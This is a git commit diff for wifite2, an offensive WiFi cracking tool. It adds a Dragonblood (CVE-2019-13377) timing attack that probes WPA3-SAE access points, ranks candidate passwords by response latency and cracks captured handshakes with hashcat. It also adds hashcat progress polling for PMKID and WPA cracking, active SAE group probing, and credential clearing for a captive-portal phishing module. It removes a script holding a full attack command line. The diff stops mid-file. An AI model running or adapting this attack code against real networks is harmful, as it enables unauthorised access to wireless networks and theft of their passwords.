@@ -1,0 +1,3440 @@
+commit 0ede49f2aee0878c651a18a2391ec63c0b2b0de2
+Author: Nonta72 <example@example.com>
+Date:   Fri Apr 24 17:47:55 2026 +0200
+
+    Merge PR
+
+diff --git a/requirements.txt b/requirements.txt
+index c5699bfcc..db249eea4 100644
+--- a/requirements.txt
++++ b/requirements.txt
+@@ -1,6 +1,6 @@
+ # Core dependencies for wifite2
+ # These should match pyproject.toml [project.dependencies]
+-chardet>=7.0.1
++chardet>=7.4.1
+ requests>=2.32.5
+ rich>=14.0.0
+ scapy>=2.7.0; python_version < '4'
+diff --git a/tools/run-automation.sh b/tools/run-automation.sh
+deleted file mode 100755
+index 58c117663..000000000
+--- a/tools/run-automation.sh
++++ /dev/null
+@@ -1,20 +0,0 @@
+-#!/usr/bin/env bash
+-
+-#
+-#  Added my personal automation settings to showcase what options may be fed by parameters.
+-#  These settings is setting which attacks to run, time consumption on each attach, faulting/timeout
+-#  parameters, as well as power (to ensure thee access points are in range and quality for an incoming attack)
+-#
+-#  But also other nifty parameters/options, like a "infinity" switch, avoid attacking targets in db.
+-#  --skip-crack is used to save time, as we can do that later with the --crack option.
+-#  For informational purposes, manufacturers are parsed in real-time with "--showm" and bssid with "--showb"
+-#
+-#  "--reaver" is specified for WPS and PIXIE parsing, "--kill" is set to kill possible interference.
+-#  while I also use "-2" for 2,5ghz, rather than "-ab" (all bands) which increases scanner time.
+-#
+-#  "--power" is set to ensure the targets are in good quality (in range) for a faster run through.
+-#
+-#  So, enjoy!
+-#
+-
+-python3 wifite.py --skip-crack --reaver -2 --showm --showb --kill --wpat 160 --pmkid-timeout 100 --wps-time 120 --no-nullpin --wps --power 28 -p 100 -inf --wps-timeout 50 --wps-fails 10 -ic
+diff --git a/wifite/args.py b/wifite/args.py
+index 580e5c0f2..a877d2725 100644
+--- a/wifite/args.py
++++ b/wifite/args.py
+@@ -768,6 +768,35 @@ against the real AP and captures valid passwords.
+                                             '(default: {G}%d sec{W})' % self.config.wpa_attack_timeout))
+         wpa.add_argument('-wpa3-timeout', help=argparse.SUPPRESS, action='store', dest='wpa3_attack_timeout', type=int)
+ 
++        # Dragonblood timing attack (CVE-2019-13377)
++        wpa.add_argument('--dragonblood-timing',
++                         action='store_true',
++                         dest='dragonblood_timing',
++                         help=Color.s('Enable {C}Dragonblood timing attack{W} (CVE-2019-13377) for APs with '
++                                      'vulnerable MODP groups (22, 23, 24). Probes the AP to measure SAE '
++                                      'response latency and partitions the password search space. '
++                                      '(default: {G}off{W})'))
++        wpa.add_argument('-dragonblood-timing', help=argparse.SUPPRESS, action='store_true', dest='dragonblood_timing')
++
++        wpa.add_argument('--dragonblood-samples',
++                         action='store',
++                         dest='dragonblood_samples',
++                         metavar='[count]',
++                         type=int,
++                         help=self._verbose('Number of timing samples per password candidate '
++                                            'during Dragonblood attack. More samples improve accuracy '
++                                            'but take longer. (default: {G}3{W})'))
++        wpa.add_argument('-dragonblood-samples', help=argparse.SUPPRESS, action='store', dest='dragonblood_samples', type=int)
++
++        wpa.add_argument('--dragonblood-max',
++                         action='store',
++                         dest='dragonblood_max_passwords',
++                         metavar='[count]',
++                         type=int,
++                         help=self._verbose('Maximum number of passwords to probe during '
++                                            'Dragonblood timing attack. (default: {G}50{W})'))
++        wpa.add_argument('-dragonblood-max', help=argparse.SUPPRESS, action='store', dest='dragonblood_max_passwords', type=int)
++
+         wpa.add_argument('--owe',
+                          action='store_true',
+                          dest='owe_filter',
+diff --git a/wifite/attack/pmkid.py b/wifite/attack/pmkid.py
+index 07abe9721..20b61d1f2 100755
+--- a/wifite/attack/pmkid.py
++++ b/wifite/attack/pmkid.py
+@@ -3,7 +3,7 @@
+ 
+ from ..model.attack import Attack
+ from ..config import Configuration
+-from ..tools.hashcat import HcxDumpTool, HcxPcapngTool, Hashcat
++from ..tools.hashcat import HcxDumpTool, HcxPcapngTool, Hashcat, HashcatCracker
+ from ..util.color import Color
+ from ..util.timer import Timer
+ from ..util.output import OutputManager
+@@ -515,7 +515,36 @@ class AttackPMKID(Attack):
+                 wordlist_name = os.path.basename(wordlist)
+                 Color.clear_entire_line()
+                 Color.pattack('PMKID', self.target, 'CRACK', 'Cracking PMKID using {C}%s{W} ...\n' % wordlist_name)
+-                key = Hashcat.crack_pmkid(pmkid_file, wordlist=wordlist)
++
++                try:
++                    with HashcatCracker(pmkid_file, wordlist) as cracker:
++                        cracker.start(show_command=Configuration.verbose > 1)
++
++                        # Polling loop for progress tracking
++                        while not cracker.is_finished():
++                            status = cracker.poll_status()
++                            if self.view:
++                                self.view.update_progress({
++                                    'progress': status['progress'],
++                                    'metrics': {
++                                        'Speed': status['speed'],
++                                        'ETA': status['eta']
++                                    }
++                                })
++
++                            # Update TUI status line periodically (approx every 2 seconds)
++                            # We use a simple sleep since this is a dedicated attack thread
++                            time.sleep(2)
++
++                        key = cracker.get_result()
++                except KeyboardInterrupt:
++                    return self._handle_hashcat_failure(
++                        '\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}'
++                    )
++                except Exception as e:
++                    log_error('AttackPMKID', f'Error during hashcat polling: {e}')
++                    continue
++
+                 if key is not None:
+                     break
+                 Color.pl('{!} {O}%s did not contain password{W}' % wordlist_name)
+diff --git a/wifite/attack/portal/credential_handler.py b/wifite/attack/portal/credential_handler.py
+index fa83bb2b2..0d1b2f3a2 100755
+--- a/wifite/attack/portal/credential_handler.py
++++ b/wifite/attack/portal/credential_handler.py
+@@ -364,20 +364,38 @@ class CredentialHandler:
+         """
+         return self.validation_results.copy()
+     
++    def clear_credentials(self):
++        """Overwrite all stored credential data in memory to prevent leakage."""
++        # Overwrite passwords in validation results
++        for result in self.validation_results:
++            if result.submission.password:
++                result.submission.password = '\x00' * len(result.submission.password)
++                result.submission.password = ''
++        # Overwrite passwords in pending submissions
++        for submission in self.pending_submissions.values():
++            if submission.password:
++                submission.password = '\x00' * len(submission.password)
++                submission.password = ''
++        # Overwrite valid credential tuples
++        for i, (ssid, password) in enumerate(self.valid_credentials):
++            self.valid_credentials[i] = (ssid, '\x00' * len(password))
++        self.valid_credentials.clear()
++        log_info('CredentialHandler', 'Credential data cleared from memory')
++
+     def clear_statistics(self):
+         """Clear all statistics and results."""
++        self.clear_credentials()
+         self.validation_results.clear()
+-        self.valid_credentials.clear()
+         self.client_attempts.clear()
+         self.client_last_attempt.clear()
+-        
++
+         self.total_submissions = 0
+         self.total_validations = 0
+         self.successful_validations = 0
+         self.failed_validations = 0
+-        
++
+         log_info('CredentialHandler', 'Statistics cleared')
+-    
++
+     def __str__(self):
+         stats = self.get_statistics()
+         return (f'CredentialHandler: {stats["total_submissions"]} submissions, '
+diff --git a/wifite/attack/wpa.py b/wifite/attack/wpa.py
+index 2ea24572a..06f1cddc7 100755
+--- a/wifite/attack/wpa.py
++++ b/wifite/attack/wpa.py
+@@ -3,7 +3,7 @@
+ 
+ from ..model.attack import Attack
+ from ..tools.aircrack import Aircrack
+-from ..tools.hashcat import Hashcat
++from ..tools.hashcat import Hashcat, HashcatCracker, HcxDumpTool, HcxPcapngTool
+ from ..tools.airodump import Airodump
+ from ..tools.aireplay import Aireplay
+ from ..config import Configuration
+@@ -413,7 +413,37 @@ class AttackWPA(Attack):
+                 })
+ 
+             try:
+-                key = Hashcat.crack_handshake(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1, wordlist=wordlist)
++                # Use the new HashcatCracker for non-blocking execution and progress polling
++                # First, generate the hash file (we use the existing HcxPcapngTool logic via a helper)
++                hash_file = HcxPcapngTool.generate_hash_file(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1)
++
++                if hash_file is None:
++                    # Fallback to aircrack-ng if hash file generation failed
++                    key = Hashcat.crack_handshake(handshake, target_is_wpa3_sae, show_command=Configuration.verbose > 1, wordlist=wordlist)
++                else:
++                    try:
++                        with HashcatCracker(hash_file, wordlist, target_is_wpa3_sae=target_is_wpa3_sae) as cracker:
++                            cracker.start(show_command=Configuration.verbose > 1)
++
++                            while not cracker.is_finished():
++                                status = cracker.poll_status()
++                                if self.view:
++                                    self.view.update_progress({
++                                        'progress': status['progress'],
++                                        'metrics': {
++                                            'Speed': status['speed'],
++                                            'ETA': status['eta']
++                                        }
++                                    })
++                                time.sleep(2)
++
++                            key = cracker.get_result()
++                    finally:
++                        if hash_file and os.path.exists(hash_file):
++                            try:
++                                os.remove(hash_file)
++                            except OSError:
++                                pass
+             except ValueError as e: # Catch errors from hash file generation (e.g. bad capture)
+                 error_msg = f"Error during hash file generation for cracking: {e}"
+                 Color.pl(f"[!] {error_msg}")
+diff --git a/wifite/attack/wpa3.py b/wifite/attack/wpa3.py
+index 4fa796152..d44d533a3 100755
+--- a/wifite/attack/wpa3.py
++++ b/wifite/attack/wpa3.py
+@@ -23,6 +23,9 @@ from ..util.wpa3 import WPA3Detector, WPA3Info
+ from ..util.wpa3_tools import WPA3ToolChecker
+ from ..attack.wpa3_strategy import WPA3AttackStrategy
+ from ..model.handshake import Handshake
++from ..model.sae_result import CrackResultSAE
++from ..model.wpa_result import CrackResultWPA
++from contextlib import contextmanager
+ import time
+ import os
+ 
+@@ -190,20 +193,143 @@ class AttackWPA3SAE(Attack):
+         result = self.attempt_downgrade()
+         if result:
+             Color.pl('{+} {G}Downgrade successful! Captured WPA2 handshake{W}')
++            # attempt_downgrade() returns a Handshake (WPA2 4-way). Wrap it
++            # so all.py's `attack.crack_result.save()` doesn't crash.
++            self.crack_result = CrackResultWPA(
++                result.bssid, result.essid, result.capfile, None)
++            self.crack_result.dump()
+             self.success = True
+             return True
+         Color.pl('{!} {O}Downgrade attack failed{W}')
+         return False
+ 
+     def _try_dragonblood(self):
+-        """Execute dragonblood strategy without internal fallback."""
+-        Color.pl('{+} {C}Attempting Dragonblood exploitation...{W}')
++        """
++        Execute Dragonblood timing attack (CVE-2019-13377).
++
++        When the AP uses MODP groups 22/23/24, the SAE hunting-and-pecking
++        algorithm leaks timing information through the quadratic-residue
++        test.  This method:
++          1. Displays vulnerability details
++          2. Runs timing probes against the AP with candidate passwords
++          3. Partitions the password space into fast/slow buckets
++          4. Reorders the wordlist and cracks with hashcat
++
++        Falls through to the next strategy if timing is disabled,
++        not viable, or cracking fails.
++        """
++        from ..util.dragonblood import DragonbloodDetector
++        from ..util.dragonblood_timing import DragonbloodTimingAttack
++
++        Color.pl('{+} {C}Attempting Dragonblood exploitation (CVE-2019-13377)...{W}')
+         if self.view:
+-            self.view.add_log('Starting Dragonblood exploitation')
++            self.view.add_log('Starting Dragonblood timing attack')
++
++        # Always show vulnerability details
+         self._display_dragonblood_vulnerability()
+-        Color.pl('{!} {O}Full Dragonblood exploitation requires specialized tools{W}')
+-        Color.pl('{!} {O}Consider using: dragonslayer, dragonforce, or dragontime{W}')
+-        return False  # Dragonblood is informational, always falls through
++
++        # Check if timing attack is enabled and viable
++        if not Configuration.dragonblood_timing:
++            Color.pl('{!} {O}Dragonblood timing attack not enabled{W}')
++            Color.pl('{!} {O}Use --dragonblood-timing to enable, '
++                     'or use external tools: dragonslayer, dragonforce{W}')
++            return False
++
++        # If passive detection didn't find any vulnerable MODP group,
++        # actively probe the AP for support. SAE groups are not in
++        # beacons — without captured SAE frames OR an active probe,
++        # sae_groups falls back to [19] and the viability check fails
++        # even against genuinely-vulnerable APs.
++        if not DragonbloodDetector.is_timing_attack_viable(self.wpa3_info):
++            self._active_probe_for_vulnerable_groups()
++
++        if not DragonbloodDetector.is_timing_attack_viable(self.wpa3_info):
++            Color.pl('{!} {O}Timing attack not viable: '
++                     'no vulnerable MODP groups (22, 23, 24) detected{W}')
++            return False
++
++        # Need a wordlist for timing probes
++        wordlist = Configuration.wordlist
++        if not wordlist or not os.path.isfile(wordlist):
++            Color.pl('{!} {O}No wordlist available for timing probes{W}')
++            Color.pl('{!} {O}Provide a wordlist with --dict to enable '
++                     'Dragonblood timing attack{W}')
++            return False
++
++        # Read candidate passwords (limited set for probing)
++        max_pw = Configuration.dragonblood_max_passwords
++        candidates = self._read_probe_candidates(wordlist, max_pw)
++        if not candidates:
++            Color.pl('{!} {O}No candidate passwords loaded from wordlist{W}')
++            return False
++
++        Color.pl('{+} {C}Loaded %d candidate passwords for timing probes{W}'
++                 % len(candidates))
++
++        # Determine the vulnerable SAE group to target
++        sae_groups = self.wpa3_info.get('sae_groups', [])
++        target_group = 0
++        for g in [22, 23, 24]:
++            if g in sae_groups:
++                target_group = g
++                break
++
++        # Run the timing attack
++        timing = DragonbloodTimingAttack(
++            interface=Configuration.interface,
++            target_bssid=self.target.bssid,
++            target_essid=self.target.essid or '',
++            target_channel=int(self.target.channel),
++            sae_group=target_group,
++        )
++
++        try:
++            analysis = timing.run(
++                passwords=candidates,
++                num_samples=Configuration.dragonblood_samples,
++                view=self.view,
++            )
++
++            if not analysis or analysis.total_samples < timing.MIN_SAMPLES:
++                Color.pl('{!} {O}Insufficient timing data collected{W}')
++                timing.print_report()
++                return False
++
++            # Show results
++            timing.print_report()
++
++            # Enrich the vulnerability report
++            if hasattr(self, 'dragonblood_vuln') and self.dragonblood_vuln:
++                DragonbloodDetector.enrich_with_timing(
++                    self.dragonblood_vuln, analysis)
++
++            if self.view:
++                self.view.add_log(
++                    f'Timing analysis: {analysis.confidence:.0%} confidence, '
++                    f'{len(analysis.fast_passwords)} fast passwords')
++
++            # If the partition is meaningful, reorder the wordlist and crack
++            if analysis.confidence >= 0.3 and analysis.fast_passwords:
++                Color.pl('{+} {G}Timing partition usable — '
++                         'reordering wordlist for optimised cracking{W}')
++
++                optimised_wl = timing.get_prioritised_wordlist(wordlist)
++                if optimised_wl:
++                    return self._crack_with_wordlist(optimised_wl)
++
++            Color.pl('{!} {O}Timing partition too weak for reliable '
++                     'password space reduction{W}')
++            return False
++
++        except KeyboardInterrupt:
++            Color.pl('\n{!} {O}Dragonblood timing attack interrupted{W}')
++            raise
++        except Exception as e:
++            Color.pl('{!} {R}Dragonblood timing error: %s{W}' % str(e))
++            log_info('AttackWPA3', 'Dragonblood timing failed: %s' % e)
++            return False
++        finally:
++            timing.cleanup()
+ 
+     def _try_sae_capture(self):
+         """Execute SAE capture strategy."""
+@@ -216,7 +342,7 @@ class AttackWPA3SAE(Attack):
+         handshake = self.capture_sae_handshake()
+         if handshake:
+             Color.pl('{+} {G}SAE handshake captured successfully{W}')
+-            self.success = True
++            self._finalize_sae_success(handshake, key=None)
+             return True
+         Color.pl('{!} {O}SAE handshake capture failed{W}')
+         return False
+@@ -248,10 +374,119 @@ class AttackWPA3SAE(Attack):
+         handshake = self.passive_capture()
+         if handshake:
+             Color.pl('{+} {G}SAE handshake captured passively{W}')
+-            self.success = True
++            self._finalize_sae_success(handshake, key=None)
+             return True
+         return False
+ 
++    def _finalize_sae_success(self, handshake, key):
++        """Wrap a captured SAE handshake in CrackResultSAE and set success.
++
++        `handshake` is an SAEHandshake object (has .capfile / .bssid / .essid).
++        `key` is the cracked PSK if known, else None.
++        """
++        self.crack_result = CrackResultSAE(
++            handshake.bssid, handshake.essid, handshake.capfile, key)
++        self.crack_result.dump()
++        self.success = True
++
++    def _active_probe_for_vulnerable_groups(self):
++        """
++        Actively probe the AP to discover supported SAE groups.
++
++        Sends SAE Commit frames per candidate group via wpa_supplicant and
++        updates `self.wpa3_info['sae_groups']` with the accepted set.
++        Requires temporarily flipping the interface to managed mode —
++        wpa_supplicant can't drive a monitor-mode interface.
++        """
++        interface = Configuration.interface
++        if not interface:
++            return
++        if not self.target.essid:
++            Color.pl('{!} {O}Active SAE probing needs an ESSID; target is hidden{W}')
++            return
++
++        Color.pl('{+} {C}Actively probing AP for supported SAE groups '
++                 '(briefly switching to managed mode)...{W}')
++        if self.view:
++            self.view.add_log('Active SAE group probing')
++
++        results = {}
++        try:
++            with self._managed_mode_for_probe(interface):
++                results = WPA3Detector.probe_sae_groups_active(
++                    interface=interface,
++                    bssid=self.target.bssid,
++                    essid=self.target.essid,
++                    channel=int(self.target.channel),
++                )
++        except Exception as e:
++            Color.pl('{!} {O}Active SAE probing failed: %s{W}' % e)
++            log_debug('AttackWPA3', 'active probe error: %s' % e)
++            return
++
++        accepted = sorted(g for g, s in results.items() if s == 'accepted')
++        rejected = sorted(g for g, s in results.items() if s == 'rejected')
++        if not accepted and not rejected:
++            Color.pl('{!} {O}Active probing yielded no usable signal '
++                     '(AP unresponsive or interface setup issue){W}')
++            return
++
++        Color.pl('{+} {C}Probed SAE groups — accepted: {G}%s{C}  rejected: {O}%s{W}'
++                 % (accepted or '-', rejected or '-'))
++        if self.view:
++            self.view.add_log('Accepted groups: %s' % (accepted or '-'))
++
++        # Merge accepted groups into wpa3_info and recompute vulnerability.
++        if accepted:
++            self.wpa3_info['sae_groups'] = accepted
++            self.wpa3_info['dragonblood_vulnerable'] = any(
++                g in WPA3Detector.VULNERABLE_SAE_GROUPS for g in accepted)
++            # Also propagate to the cached WPA3Info object so later
++            # strategy decisions see the same state.
++            info = getattr(self.target, 'wpa3_info', None)
++            if info is not None and hasattr(info, 'sae_groups'):
++                info.sae_groups = accepted
++                info.dragonblood_vulnerable = self.wpa3_info['dragonblood_vulnerable']
++
++    @staticmethod
++    @contextmanager
++    def _managed_mode_for_probe(interface):
++        """
++        Context manager: put `interface` in managed mode, restore monitor.
++
++        wpa_supplicant requires a managed-mode interface; our scanning
++        interface is normally in monitor mode. We use iw to toggle and
++        ensure we restore even on error.
++        """
++        from ..tools.iw import Iw
++        from ..tools.ip import Ip
++        was_monitor = False
++        try:
++            was_monitor = Iw.is_monitor(interface)
++        except Exception:
++            was_monitor = True  # assume monitor; restore conservatively
++
++        try:
++            if was_monitor:
++                Ip.down(interface)
++                Iw.mode(interface, 'managed')
++                Ip.up(interface)
++                log_debug('AttackWPA3',
++                          '%s → managed mode for SAE probing' % interface)
++            yield
++        finally:
++            if was_monitor:
++                try:
++                    Ip.down(interface)
++                    Iw.mode(interface, 'monitor')
++                    Ip.up(interface)
++                    log_debug('AttackWPA3',
++                              '%s → monitor mode restored' % interface)
++                except Exception as e:
++                    log_debug('AttackWPA3',
++                              'monitor restore failed for %s: %s'
++                              % (interface, e))
++
+     def _check_wpa3_tools(self):
+         """
+         Check if required WPA3 tools are available.
+@@ -355,6 +590,68 @@ class AttackWPA3SAE(Attack):
+                 verbose=True
+             )
+ 
++    @staticmethod
++    def _read_probe_candidates(wordlist_path: str, max_count: int) -> list:
++        """
++        Read the first *max_count* valid WPA passwords from a wordlist.
++
++        Filters to 8-63 character passwords (WPA-PSK / SAE requirement).
++        """
++        candidates = []
++        try:
++            with open(wordlist_path, 'r', errors='replace') as fh:
++                for line in fh:
++                    word = line.rstrip('\n\r')
++                    if 8 <= len(word) <= 63:
++                        candidates.append(word)
++                        if len(candidates) >= max_count:
++                            break
++        except Exception as e:
++            log_info('AttackWPA3', 'Error reading wordlist: %s' % e)
++        return candidates
++
++    def _crack_with_wordlist(self, wordlist_path: str) -> bool:
++        """
++        Crack a captured SAE handshake using hashcat with the given wordlist.
++
++        Attempts a quick SAE capture, then cracks with hashcat mode 22000
++        using the timing-optimised wordlist.
++
++        Returns:
++            True if cracking succeeds.
++        """
++        from ..util.sae_crack import SAECracker
++
++        Color.pl('{+} {C}Capturing SAE handshake for Dragonblood-optimised cracking...{W}')
++        if self.view:
++            self.view.add_log('Capturing SAE handshake for optimised cracking')
++
++        sae_hs = self.capture_sae_handshake()
++        if not sae_hs:
++            Color.pl('{!} {O}Could not capture SAE handshake for cracking{W}')
++            return False
++
++        Color.pl('{+} {C}Cracking with timing-optimised wordlist...{W}')
++        if self.view:
++            self.view.add_log('Cracking with timing-optimised wordlist')
++
++        key = SAECracker.crack_sae_handshake(
++            sae_hs,
++            wordlist=wordlist_path,
++            show_command=True,
++            verbose=True,
++        )
++        if key:
++            Color.pl('{+} {G}Dragonblood timing attack successful!{W}')
++            Color.pl('{+} {G}Key: {C}%s{W}' % key)
++            self._finalize_sae_success(sae_hs, key=key)
++            if self.view:
++                self.view.add_log(f'Key found: {key}')
++            return True
++
++        Color.pl('{!} {O}Cracking with timing-optimised wordlist failed{W}')
++        return False
++
+     def _display_strategy(self):
+         """Display selected attack strategy to user."""
+         strategy_display = WPA3AttackStrategy.format_strategy_display(
+@@ -803,7 +1100,7 @@ class AttackWPA3SAE(Attack):
+                         else:
+                             # Incomplete handshake detected
+                             incomplete_handshake_count += 1
+-                            Color.pl('{!} {O}Incomplete SAE handshake detected (attempt %d/%d){W}' % 
++                            Color.pl('\n{!} {O}Incomplete SAE handshake detected (attempt %d/%d){W}' %
+                                    (incomplete_handshake_count, max_incomplete_attempts))
+                             if self.view:
+                                 self.view.add_log(f'Incomplete handshake (attempt {incomplete_handshake_count})')
+@@ -974,7 +1271,7 @@ class AttackWPA3SAE(Attack):
+                         else:
+                             # Incomplete handshake detected
+                             incomplete_handshake_count += 1
+-                            Color.pl('{!} {O}Incomplete SAE handshake detected (attempt %d){W}' % 
++                            Color.pl('\n{!} {O}Incomplete SAE handshake detected (attempt %d){W}' %
+                                    incomplete_handshake_count)
+                             if self.view:
+                                 self.view.add_log(f'Incomplete handshake (attempt {incomplete_handshake_count})')
+diff --git a/wifite/config/__init__.py b/wifite/config/__init__.py
+index 834445e9d..cc980f7ec 100644
+--- a/wifite/config/__init__.py
++++ b/wifite/config/__init__.py
+@@ -116,6 +116,9 @@ class Configuration:
+     wpa3_force_sae = None
+     wpa3_check_dragonblood = None
+     wpa3_attack_timeout = None
++    dragonblood_timing = None
++    dragonblood_samples = 3
++    dragonblood_max_passwords = 50
+     wpa_handshake_dir = None
+     wpa_strip_handshake = None
+     wps_fail_threshold = None
+diff --git a/wifite/config/defaults.py b/wifite/config/defaults.py
+index 382a0169a..edaa05795 100644
+--- a/wifite/config/defaults.py
++++ b/wifite/config/defaults.py
+@@ -95,6 +95,9 @@ def initialize_defaults(cls):
+     cls.wpa3_force_sae = False  # Skip WPA2 attacks on transition mode
+     cls.wpa3_check_dragonblood = False  # Only scan for Dragonblood vulnerabilities
+     cls.wpa3_attack_timeout = None  # WPA3-specific timeout (defaults to wpa_attack_timeout)
++    cls.dragonblood_timing = False  # Enable Dragonblood timing attack (CVE-2019-13377)
++    cls.dragonblood_samples = 3  # Timing samples per password candidate
++    cls.dragonblood_max_passwords = 50  # Max passwords to probe during timing attack
+ 
+     # PMKID variables
+     cls.use_pmkid_only = False  # Only use PMKID Capture+Crack attack
+diff --git a/wifite/config/parsers/wpa.py b/wifite/config/parsers/wpa.py
+index dfc14c401..95d7c3f2c 100644
+--- a/wifite/config/parsers/wpa.py
++++ b/wifite/config/parsers/wpa.py
+@@ -80,6 +80,18 @@ def parse_wpa_args(cls, args):
+         # Default to wpa_attack_timeout if not specified
+         cls.wpa3_attack_timeout = cls.wpa_attack_timeout
+ 
++    if hasattr(args, 'dragonblood_timing') and args.dragonblood_timing:
++        cls.dragonblood_timing = True
++        Color.pl('{+} {C}option:{W} will use {C}Dragonblood timing attack{W} (CVE-2019-13377) on vulnerable APs')
++
++    if hasattr(args, 'dragonblood_samples') and args.dragonblood_samples:
++        cls.dragonblood_samples = args.dragonblood_samples
++        Color.pl('{+} {C}option:{W} Dragonblood timing samples per password: {G}%d{W}' % args.dragonblood_samples)
++
++    if hasattr(args, 'dragonblood_max_passwords') and args.dragonblood_max_passwords:
++        cls.dragonblood_max_passwords = args.dragonblood_max_passwords
++        Color.pl('{+} {C}option:{W} Dragonblood max passwords to probe: {G}%d{W}' % args.dragonblood_max_passwords)
++
+     if args.ignore_old_handshakes:
+         cls.ignore_old_handshakes = True
+         Color.pl('{+} {C}option:{W} will {O}ignore{W} existing handshakes (force capture)')
+diff --git a/wifite/model/sae_handshake.py b/wifite/model/sae_handshake.py
+index 3498bc413..ba8c246bc 100755
+--- a/wifite/model/sae_handshake.py
++++ b/wifite/model/sae_handshake.py
+@@ -319,6 +319,38 @@ class SAEHandshake:
+         else:
+             Color.pl('    Status: {R}Incomplete or invalid SAE handshake{W}')
+ 
++    def extract_frame_timing(self) -> List[Dict]:
++        """
++        Extract precise timestamps for all SAE Commit/Confirm frames.
++
++        Uses tshark to pull per-frame epoch timestamps so that response
++        latencies can be computed externally (e.g. by DragonbloodTimingAttack).
++
++        Returns:
++            List of dicts with keys: type ('commit'/'confirm'), timestamp,
++            src, dst, seq, sae_group.
++        """
++        from ..util.dragonblood_timing import DragonbloodTimingAttack
++        return DragonbloodTimingAttack.extract_timing_from_pcap(
++            self.capfile, self.bssid)
++
++    def get_ap_response_times_us(self) -> List[float]:
++        """
++        Compute AP SAE Commit response latencies from this capture.
++
++        Pairs each client-sent Commit with the next AP-sent Commit and
++        returns the time deltas in microseconds.
++
++        Returns:
++            List of response times in microseconds.
++        """
++        from ..util.dragonblood_timing import DragonbloodTimingAttack
++        frames = self.extract_frame_timing()
++        if not frames:
++            return []
++        return DragonbloodTimingAttack.compute_pcap_response_times(
++            frames, self.bssid)
++
+     @staticmethod
+     def check_tools() -> Dict[str, bool]:
+         """
+diff --git a/wifite/tools/airodump.py b/wifite/tools/airodump.py
+index d7fd2fb75..82ff1991a 100755
+--- a/wifite/tools/airodump.py
++++ b/wifite/tools/airodump.py
+@@ -206,8 +206,15 @@ class Airodump(Dependency):
+                 # No tshark, or it failed. Fall-back to wash
+                 Wash.check_for_wps_and_update_targets(capfile, new_targets)
+ 
+-        # Detect WPA3 capabilities for all targets
+-        Airodump.detect_wpa3_capabilities(new_targets)
++        # Detect WPA3 capabilities for all targets.
++        # Pass airodump's running capfile so WPA3Detector can parse real
++        # PMF bits from beacon RSN IEs (and SAE groups from any captured
++        # commit frames) instead of falling back to heuristics.
++        capfile = f'{csv_filename[:-3]}cap'
++        Airodump.detect_wpa3_capabilities(
++            new_targets,
++            capfile=capfile if os.path.isfile(capfile) else None,
++        )
+ 
+         # Honeypot / rogue AP detection
+         if Configuration.detect_honeypots:
+@@ -316,27 +323,28 @@ class Airodump(Dependency):
+         return targets2
+ 
+     @staticmethod
+-    def detect_wpa3_capabilities(targets):
++    def detect_wpa3_capabilities(targets, capfile=None):
+         """
+         Detect and store WPA3 capabilities for all targets.
+-        This method analyzes each target's encryption and authentication
+-        information to determine WPA3 support, transition mode, PMF status,
+-        and other WPA3-related capabilities.
+-        Performance: Detection results are cached in target.wpa3_info.
+-        Subsequent calls to WPA3Detector methods will use cached data.
+ 
+         Args:
+             targets: List of Target objects to analyze
++            capfile: Optional pcap/pcapng file; when provided, WPA3Detector
++                     uses it to parse real PMF bits from beacon RSN IEs and
++                     observed SAE groups from any SAE Commit frames. This
++                     turns Dragonblood detection from a hardcoded [19]
++                     default into data-driven detection.
+         """
+         for target in targets:
+             # Skip if already detected (cached)
+             if hasattr(target, 'wpa3_info') and target.wpa3_info is not None:
++                # Opportunistically refine from the capture if we have one
++                if capfile:
++                    WPA3Detector.refresh_from_capture(target, capfile)
+                 continue
+ 
+-            # Detect WPA3 capability (use_cache=False since we're setting it)
+-            wpa3_info_dict = WPA3Detector.detect_wpa3_capability(target, use_cache=False)
+-
+-            # Create WPA3Info object and attach to target for caching
++            wpa3_info_dict = WPA3Detector.detect_wpa3_capability(
++                target, use_cache=False, capfile=capfile)
+             target.wpa3_info = WPA3Info.from_dict(wpa3_info_dict)
+ 
+     @staticmethod
+diff --git a/wifite/tools/dnsmasq.py b/wifite/tools/dnsmasq.py
+index 1274adb0c..cbfe15145 100755
+--- a/wifite/tools/dnsmasq.py
++++ b/wifite/tools/dnsmasq.py
+@@ -41,6 +41,8 @@ class Dnsmasq(Dependency):
+             dhcp_range_end: End of DHCP range
+             portal_ip: IP address to redirect DNS queries to (defaults to gateway_ip)
+         """
++        from ..config.validators import validate_interface_name
++        validate_interface_name(interface)
+         self.interface = interface
+         self.gateway_ip = gateway_ip
+         self.dhcp_range_start = dhcp_range_start
+@@ -92,11 +94,9 @@ class Dnsmasq(Dependency):
+         # DNS configuration - redirect all queries to portal
+         config.append(f'address=/#/{self.portal_ip}')
+         
+-        # Lease file
++        # Lease file (always use the secure temp file created in create_config_file)
+         if self.lease_file:
+             config.append(f'dhcp-leasefile={self.lease_file}')
+-        else:
+-            config.append('dhcp-leasefile=/tmp/dnsmasq.leases')
+         
+         # Logging
+         config.append('log-queries')
+@@ -137,13 +137,14 @@ class Dnsmasq(Dependency):
+             # Set permissions
+             os.chmod(self.config_file, 0o600)
+             
+-            # Create lease file
++            # Create lease file with restricted permissions
+             fd_lease, self.lease_file = tempfile.mkstemp(
+                 prefix='dnsmasq_leases_',
+                 suffix='.txt',
+                 dir=Configuration.temp()
+             )
+             os.close(fd_lease)
++            os.chmod(self.lease_file, 0o600)
+             
+             log_debug('Dnsmasq', f'Created config file: {self.config_file}')
+             log_debug('Dnsmasq', f'Created lease file: {self.lease_file}')
+@@ -163,7 +164,7 @@ class Dnsmasq(Dependency):
+     def start(self) -> bool:
+         """
+         Start dnsmasq process.
+-        
++
+         Returns:
+             True if started successfully, False otherwise
+         """
+@@ -171,50 +172,52 @@ class Dnsmasq(Dependency):
+             if self.running:
+                 log_warning('Dnsmasq', 'Already running')
+                 return True
+-            
++
+             # Create config file
+             if not self.config_file:
+                 self.create_config_file()
+-            
++
+             # Setup IP forwarding and routing
+             self._setup_routing()
+-            
++
+             # Start dnsmasq
+             cmd = [
+                 'dnsmasq',
+                 '--conf-file=%s' % self.config_file,
+                 '--no-daemon'
+             ]
+-            
++
+             if Configuration.verbose > 0:
+                 Color.pl('{+} Starting dnsmasq: {D}%s{W}' % ' '.join(cmd))
+-            
++
+             self.process = Process(cmd, devnull=False)
+-            
++
+             # Wait a moment for startup
+             time.sleep(1)
+-            
++
+             # Check if process is running
+             if self.process.poll() is not None:
+-                # Process died
++                # Process died — clean up temp files
+                 output = self.process.stdout()
